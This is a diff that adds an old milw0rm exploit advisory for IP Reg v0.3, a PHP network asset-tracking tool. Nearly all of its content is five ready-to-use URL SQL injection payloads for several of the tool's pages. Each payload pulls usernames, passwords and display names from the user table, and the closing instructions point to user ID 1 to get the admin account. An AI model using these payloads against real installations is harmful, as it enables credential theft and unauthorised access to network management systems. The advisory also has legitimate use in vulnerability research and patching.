@@ -1,0 +1,42 @@
+---------------------------------------------------------------
+ ____            __________         __             ____  __   
+/_   | ____     |__\_____  \  _____/  |_          /_   |/  |_ 
+ |   |/    \    |  | _(__  <_/ ___\   __\  ______  |   \   __\
+ |   |   |  \   |  |/       \  \___|  |   /_____/  |   ||  |  
+ |___|___|  /\__|  /______  /\___  >__|            |___||__|  
+          \/\______|      \/     \/                           
+---------------------------------------------------------------
+
+Http://www.inj3ct-it.org	    Staff[at]inj3ct-it[dot]org	
+
+---------------------------------------------------------------
+
+	 Multiple Remote Sql Injection
+
+---------------------------------------------------------------
+
+# Author: MhZ91 
+# Title: Ip Reg v0.3 - Remote Sql Injection
+# Download: http://sourceforge.net/project/showfiles.php?group_id=211757
+# Bug: Remote Sql Injection
+# Info: IP Reg is a IPAM tool to keep track of assets, nodes (IP addresses, MAC addresses, DNS aliases) within different subnets, over different locations or even VLAN's. Written in PHP, use it with a MySQL-database to have a unique insight in your local network
+# Visit: http://www.inj3ct-it.org
+
+---------------------------------------------------------------
+
+http://[site]/vlanview.php?vlan_id='+union+select+1,2,concat(user_name,char(58),user_pass,char(58),user_displayname)+from+user+where+user_id=[UserID]/*
+
+http://[site]/vlanedit.php?vlan_id='+union+select+1,2,concat(user_name,char(58),user_pass,char(58),user_displayname)+from+user+where+user_id=[UserID]/*
+
+http://[site]/vlandel.php?vlan_id='+union+select+1,2,concat(user_name,char(58),user_pass,char(58),user_displayname)+from+user+where+user_id=[UserID]/*
+
+http://[site]/assetclassgroupview.php?assetclassgroup_id='+union+select+1,concat(user_name,char(58),user_pass,char(58),user_displayname)+from+user+where+user_id=[UserID]/*
+
+http://[site]/nodelist.php?subnet_id='+union+select+1,2,3,4,5,6,7,concat(user_name,char(58),user_pass,char(58),user_displayname)+from+user+where+user_id=[UserID]/*
+
+There is other more sql injection.
+
+For get user, password and status of the members, u must edit [UserID] whit number.. The number 1 it's the default id of the admin.
+---------------------------------------------------------------
+
+# milw0rm.com [2007-12-22]
